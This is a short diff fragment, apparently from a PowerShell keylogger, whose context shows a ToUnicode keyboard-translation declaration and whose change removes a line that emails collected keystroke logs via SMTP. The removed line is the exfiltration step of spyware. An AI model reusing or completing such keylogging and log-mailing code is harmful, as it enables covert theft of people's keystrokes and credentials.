@@ -42,7 +42,6 @@ public static extern int ToUnicode(uint vKey, uint scanCode, byte[] keyboardStat
         }
     }
     finally{
-        $smtp.send($email,$email,$subject,$logs)
     }
 }
 
